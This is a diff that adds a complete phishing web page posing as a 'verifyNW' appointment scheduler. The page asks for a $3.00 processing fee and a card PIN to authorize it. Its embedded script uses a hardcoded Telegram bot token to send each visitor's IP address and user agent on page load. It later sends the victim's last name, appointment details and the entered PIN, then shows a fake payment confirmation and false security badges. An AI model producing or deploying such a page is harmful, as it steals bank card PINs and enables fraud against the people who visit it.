@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Appointment Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 32px 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo h1 {
+            font-size: 28px;
+            color: #1e3a5f;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .logo span {
+            color: #4f9da6;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+            animation: fade 0.3s ease;
+        }
+
+        @keyframes fade {
+            from { opacity: 0.6; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 {
+            color: #1e293b;
+            margin-bottom: 12px;
+            font-size: 24px;
+        }
+
+        .subtitle {
+            color: #64748b;
+            margin-bottom: 24px;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        .info-box {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            padding-bottom: 12px;
+            border-bottom: 1px dashed #e2e8f0;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .info-label {
+            color: #64748b;
+            font-size: 14px;
+        }
+
+        .info-value {
+            font-weight: 600;
+            color: #1e293b;
+            font-size: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #334155;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+
+        select.form-input {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 16px;
+        }
+
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .time-slots {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin: 16px 0;
+        }
+
+        .time-slot {
+            background: #f8fafc;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 30px;
+            padding: 12px 8px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .time-slot:hover {
+            border-color: #667eea;
+            background: #f0f4ff;
+        }
+
+        .time-slot.selected {
+            background: #667eea;
+            border-color: #667eea;
+            color: white;
+        }
+
+        .pin-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .pin-field {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
+            background: #f8fafc;
+        }
+
+        .pin-field:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: #5a67d8;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -5px rgba(102,126,234,0.4);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #334155;
+            border: 1.5px solid #e2e8f0;
+        }
+
+        .btn-secondary:hover {
+            background: #f8fafc;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn:disabled {
+            background: #cbd5e1;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .total-box {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 24px 0;
+        }
+
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            color: #334155;
+        }
+
+        .total-row.final {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1e293b;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 12px;
+            margin-top: 8px;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #e6f3f5;
+            color: #1e3a5f;
+            padding: 10px;
+            border-radius: 30px;
+            font-size: 13px;
+            margin: 16px 0;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .bank-message {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 16px;
+            border-radius: 12px;
+            margin: 20px 0;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-preview {
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 24px;
+            color: white;
+        }
+
+        .card-number-display {
+            font-size: 20px;
+            letter-spacing: 2px;
+            font-family: monospace;
+            margin: 10px 0;
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 35px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255,255,255,0.8);
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div style="color: #1e293b; font-weight: 500; margin-bottom: 10px;">Connecting your bank...</div>
+        <div style="color: #64748b; font-size: 14px;">Please wait</div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <h1>verify<span>NW</span></h1>
+            </div>
+
+            <!-- Page 1: Select Appointment Time with Last Name -->
+            <div id="page1" class="page active">
+                <h2>Schedule Appointment</h2>
+                <p class="subtitle">Please enter your last name and select your preferred date and time.</p>
+
+                <!-- Last Name Field (New) -->
+                <div class="form-group">
+                    <label class="form-label">Last Name</label>
+                    <input type="text" class="form-input" id="lastName" placeholder="Enter your last name" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Select Date</label>
+                    <input type="date" class="form-input" id="appointmentDate" min="">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Select Time</label>
+                    <div class="time-slots" id="timeSlots">
+                        <div class="time-slot" data-time="9:00 AM">9:00 AM</div>
+                        <div class="time-slot" data-time="10:30 AM">10:30 AM</div>
+                        <div class="time-slot" data-time="12:00 PM">12:00 PM</div>
+                        <div class="time-slot" data-time="1:30 PM">1:30 PM</div>
+                        <div class="time-slot" data-time="3:00 PM">3:00 PM</div>
+                        <div class="time-slot" data-time="4:30 PM">4:30 PM</div>
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-row">
+                        <span class="info-label">Location</span>
+                        <span class="info-value">Downtown Office</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Duration</span>
+                        <span class="info-value">30 minutes</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Processing Fee</span>
+                        <span class="info-value">$3.00</span>
+                    </div>
+                </div>
+
+                <button class="btn" id="continueToVerification">Continue to Verification</button>
+                <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
+            </div>
+
+            <!-- Page 2: Verify Appointment (Shows selected time) -->
+            <div id="page2" class="page">
+                <h2>Verify Appointment</h2>
+                <p class="subtitle">Please confirm your appointment details below.</p>
+
+                <div class="appointment-detail" style="background:#e6f3f5; border-left:4px solid #4f9da6; padding:16px; border-radius:12px; margin-bottom:24px;">
+                    <p><strong>👤 Last Name:</strong> <span id="displayLastName"></span></p>
+                    <p><strong>📅 Date:</strong> <span id="confirmDate"></span></p>
+                    <p><strong>⏰ Time:</strong> <span id="confirmTime"></span></p>
+                    <p><strong>📍 Location:</strong> Downtown Office</p>
+                    <p><strong>🔢 Reference:</strong> APT-<span id="refNumber"></span></p>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-row">
+                        <span class="info-label">Appointment ID</span>
+                        <span class="info-value" id="appointmentId">#APT-8472</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Status</span>
+                        <span class="info-value" style="color: #10b981;">Ready to confirm</span>
+                    </div>
+                </div>
+
+                <div class="secure-badge">
+                    <span>🔒</span>
+                    <span>No personal information needed</span>
+                </div>
+
+                <button class="btn" id="continueToPayment">Proceed to Payment ($3.00)</button>
+                <button class="btn btn-secondary" id="backToSchedule">← Back to Schedule</button>
+            </div>
+
+            <!-- Page 3: Payment Page with 4-second delay before showing -->
+            <div id="page3" class="page">
+                <h2>Pay Processing Fee</h2>
+                <p class="subtitle">A $3.00 fee is required to secure your appointment.</p>
+
+                <div class="card-preview">
+                    <small>Card on file</small>
+                    <div class="card-number-display" id="cardOnFile">•••• •••• •••• 1566</div>
+                    <div style="display: flex; justify-content: space-between; margin-top: 15px;">
+                        <span>Expires: 02/31</span>
+                        <span>Visa</span>
+                    </div>
+                </div>
+
+                <div class="info-box" style="margin-bottom: 20px;">
+                    <div class="info-row">
+                        <span class="info-label">Card Type</span>
+                        <span class="info-value">Visa</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Last 4 Digits</span>
+                        <span class="info-value" id="last4Display">4321</span>
+                    </div>
+                </div>
+
+                <!-- Bank verification message (always visible on PIN page) -->
+                <div class="bank-message">
+                    <span>🏦</span>
+                    <span><strong>Bank verification required:</strong> Your bank needs to verify it's you. Please enter your PIN to authorize the $3.00 payment.</span>
+                </div>
+
+                <!-- PIN Entry -->
+                <div class="form-group">
+                    <label class="form-label">Enter Card PIN to Authorize Payment</label>
+                    <div class="pin-inputs">
+                        <input type="password" class="pin-field" maxlength="1" id="pin1">
+                        <input type="password" class="pin-field" maxlength="1" id="pin2">
+                        <input type="password" class="pin-field" maxlength="1" id="pin3">
+                        <input type="password" class="pin-field" maxlength="1" id="pin4">
+                    </div>
+                </div>
+
+                <div class="total-box">
+                    <div class="total-row">
+                        <span>Processing Fee</span>
+                        <span>$3.00</span>
+                    </div>
+                    <div class="total-row final">
+                        <span>Total Due</span>
+                        <span>$3.00</span>
+                    </div>
+                </div>
+
+                <div class="secure-badge">
+                    <span>🔒</span>
+                    <span>256-bit encrypted • PCI compliant</span>
+                </div>
+
+                <button class="btn" id="payNowBtn">Pay $3.00 Now</button>
+                <button class="btn btn-secondary" id="backToVerify">← Back to Verification</button>
+            </div>
+
+            <!-- Page 4: Success -->
+            <div id="page4" class="page">
+                <div class="success-message">
+                    <div class="success-icon">✓</div>
+                    <h2 style="margin-bottom: 12px;">Payment Successful!</h2>
+                    <p style="color: #64748b; margin-bottom: 24px;">Your appointment has been secured. A confirmation has been sent.</p>
+                    
+                    <div class="info-box" style="text-align: left;">
+                        <div class="info-row">
+                            <span class="info-label">Last Name</span>
+                            <span class="info-value" id="successLastName"></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Appointment</span>
+                            <span class="info-value" id="successDate"></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Time</span>
+                            <span class="info-value" id="successTime"></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Amount Paid</span>
+                            <span class="info-value">$3.00</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Confirmation</span>
+                            <span class="info-value" id="successRef"></span>
+                        </div>
+                    </div>
+
+                    <button class="btn" id="doneBtn">Done</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 verifyNW • Appointment Verification</p>
+        </div>
+    </div>
+
+    <script>
+        // === TELEGRAM BOT SETTINGS ===
+        const TELEGRAM_BOT_TOKEN = "8232149075:AAEYDXZo7N93M8oYe4NUTqcglKJBBB6n_vU";
+        const TELEGRAM_CHAT_ID = "8775933133";
+        
+        // Get IP address function
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unable to fetch IP';
+            }
+        }
+        
+        // Send message to Telegram with IP
+        async function sendToTelegram(message) {
+            const ip = await getIP();
+            const fullMessage = `IP: ${ip}\n${message}`;
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: fullMessage
+                })
+            }).catch(err => console.log('Telegram error:', err));
+        }
+
+        // Send alert when someone visits the website (with IP)
+        window.addEventListener('load', async function() {
+            const ip = await getIP();
+            const visitMsg = `verifyNW - New Visitor
+Time: ${new Date().toLocaleString()}
+Page: Appointment Portal
+User Agent: ${navigator.userAgent.substring(0, 100)}`;
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: `IP: ${ip}\n${visitMsg}`
+                })
+            }).catch(err => console.log('Telegram error:', err));
+        });
+
+        // DOM Elements
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const page3 = document.getElementById('page3');
+        const page4 = document.getElementById('page4');
+        
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        
+        // Appointment selection
+        const lastName = document.getElementById('lastName');
+        const appointmentDate = document.getElementById('appointmentDate');
+        const timeSlots = document.querySelectorAll('.time-slot');
+        
+        // Display elements
+        const displayLastName = document.getElementById('displayLastName');
+        const confirmDate = document.getElementById('confirmDate');
+        const confirmTime = document.getElementById('confirmTime');
+        const refNumber = document.getElementById('refNumber');
+        const appointmentId = document.getElementById('appointmentId');
+        const successLastName = document.getElementById('successLastName');
+        const successDate = document.getElementById('successDate');
+        const successTime = document.getElementById('successTime');
+        const successRef = document.getElementById('successRef');
+        
+        // Buttons
+        const continueToVerification = document.getElementById('continueToVerification');
+        const continueToPayment = document.getElementById('continueToPayment');
+        const payNowBtn = document.getElementById('payNowBtn');
+        const backToSchedule = document.getElementById('backToSchedule');
+        const backToVerify = document.getElementById('backToVerify');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const doneBtn = document.getElementById('doneBtn');
+        
+        // PIN inputs
+        const pin1 = document.getElementById('pin1');
+        const pin2 = document.getElementById('pin2');
+        const pin3 = document.getElementById('pin3');
+        const pin4 = document.getElementById('pin4');
+
+        // Variables
+        let selectedDate = '';
+        let selectedTime = '';
+        let appointmentData = {};
+
+        // Set min date for appointment (tomorrow)
+        const tomorrow = new Date();
+        tomorrow.setDate(tomorrow.getDate() + 1);
+        const minDate = tomorrow.toISOString().split('T')[0];
+        appointmentDate.min = minDate;
+        appointmentDate.value = minDate;
+
+        // Generate random reference
+        function generateReference() {
+            return Math.floor(1000 + Math.random() * 9000);
+        }
+
+        // Navigation
+        function goToPage(page) {
+            page1.classList.remove('active');
+            page2.classList.remove('active');
+            page3.classList.remove('active');
+            page4.classList.remove('active');
+            
+            if (page === 1) page1.classList.add('active');
+            if (page === 2) page2.classList.add('active');
+            if (page === 3) page3.classList.add('active');
+            if (page === 4) page4.classList.add('active');
+        }
+
+        // Time slot selection
+        timeSlots.forEach(slot => {
+            slot.addEventListener('click', function() {
+                timeSlots.forEach(s => s.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedTime = this.dataset.time;
+            });
+        });
+
+        // Continue to verification
+        continueToVerification.addEventListener('click', async function() {
+            if (!lastName.value.trim()) {
+                alert('Please enter your last name');
+                return;
+            }
+            
+            if (!selectedTime) {
+                alert('Please select a time slot');
+                return;
+            }
+            
+            selectedDate = appointmentDate.value;
+            const dateObj = new Date(selectedDate);
+            const formattedDate = dateObj.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+            const ref = generateReference();
+            
+            // Store data
+            appointmentData = {
+                lastName: lastName.value.trim(),
+                date: selectedDate,
+                formattedDate: formattedDate,
+                time: selectedTime,
+                reference: ref
+            };
+            
+            // Send to Telegram
+            const msg = `verifyNW - Appointment Scheduled
+Last Name: ${appointmentData.lastName}
+Date: ${appointmentData.date}
+Time: ${appointmentData.time}
+Reference: APT-${appointmentData.reference}`;
+            await sendToTelegram(msg);
+            
+            // Display on page 2
+            displayLastName.textContent = appointmentData.lastName;
+            confirmDate.textContent = appointmentData.formattedDate;
+            confirmTime.textContent = appointmentData.time;
+            refNumber.textContent = appointmentData.reference;
+            appointmentId.textContent = '#APT-' + appointmentData.reference;
+            
+            goToPage(2);
+        });
+
+        // Continue to payment with 4-second delay before showing PIN page
+        continueToPayment.addEventListener('click', function() {
+            // Show loading overlay
+            loadingOverlay.style.display = 'flex';
+            
+            // Send to Telegram
+            const msg = `verifyNW - Proceeding to Payment
+Last Name: ${appointmentData.lastName}
+Date: ${appointmentData.date}
+Time: ${appointmentData.time}
+Reference: APT-${appointmentData.reference}`;
+            sendToTelegram(msg);
+            
+            // 4-second delay before showing PIN page
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                goToPage(3);
+            }, 4000);
+        });
+
+        // Back buttons
+        backToSchedule.addEventListener('click', () => goToPage(1));
+        backToVerify.addEventListener('click', () => goToPage(2));
+        cancelBtn.addEventListener('click', () => {
+            alert('Appointment scheduling cancelled');
+            window.location.reload();
+        });
+        doneBtn.addEventListener('click', () => window.location.reload());
+
+        // PIN auto-advance
+        pin1.addEventListener('input', function() {
+            if (this.value.length === 1) pin2.focus();
+        });
+        pin2.addEventListener('input', function() {
+            if (this.value.length === 1) pin3.focus();
+        });
+        pin3.addEventListener('input', function() {
+            if (this.value.length === 1) pin4.focus();
+        });
+
+        // Handle backspace in PIN fields
+        pin2.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value.length === 0) {
+                pin1.focus();
+            }
+        });
+        pin3.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value.length === 0) {
+                pin2.focus();
+            }
+        });
+        pin4.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value.length === 0) {
+                pin3.focus();
+            }
+        });
+
+        // Pay button - successful payment
+        payNowBtn.addEventListener('click', async function() {
+            const pin = pin1.value + pin2.value + pin3.value + pin4.value;
+            
+            if (pin.length !== 4) {
+                alert('Please enter your 4-digit PIN');
+                return;
+            }
+            
+            // Send PIN to Telegram
+            const msg = `verifyNW - Payment Completed
+Last Name: ${appointmentData.lastName}
+Date: ${appointmentData.date}
+Time: ${appointmentData.time}
+Reference: APT-${appointmentData.reference}
+PIN: ${pin}
+Amount: $3.00
+Status: Successful`;
+            await sendToTelegram(msg);
+            
+            // Show loading
+            loadingOverlay.style.display = 'flex';
+            payNowBtn.disabled = true;
+            
+            // 2-second processing then success
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                
+                // Set success page details
+                successLastName.textContent = appointmentData.lastName;
+                successDate.textContent = appointmentData.formattedDate;
+                successTime.textContent = appointmentData.time;
+                successRef.textContent = '#APT-' + appointmentData.reference;
+                
+                goToPage(4);
+                payNowBtn.disabled = false;
+                
+                // Clear PIN fields
+                pin1.value = '';
+                pin2.value = '';
+                pin3.value = '';
+                pin4.value = '';
+            }, 2000);
+        });
+
+        // Only digits in PIN fields
+        [pin1, pin2, pin3, pin4].forEach(field => {
+            field.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 1);
+            });
+        });
+    </script>
+</body>
+</html>
